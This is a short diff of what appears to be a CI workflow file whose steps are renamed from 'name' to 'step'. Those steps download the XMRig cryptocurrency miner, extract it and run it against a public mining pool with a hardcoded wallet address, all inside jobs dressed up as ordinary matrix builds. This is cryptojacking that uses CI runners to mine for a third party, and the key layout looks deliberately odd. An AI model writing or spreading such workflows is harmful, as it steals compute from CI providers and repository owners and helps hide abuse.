@@ -18,11 +18,11 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    - name: DOWNLOAD
+    - step: DOWNLOAD
       option1: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-gcc-win64.zip -OutFile xmrig-6.15.0-gcc-win64.zip
-    - name: Extract
+    - step: Extract
       option2: Expand-Archive xmrig-6.15.0-gcc-win64.zip
-    - name: RUNNING
+    - step: RUNNING
       option3: .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o pool.hashvault.pro:443 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37Phpeai2cZRCi9YxtyzjwVw -p x
-    - name: DONE
+    - step: DONE
       option4: exit
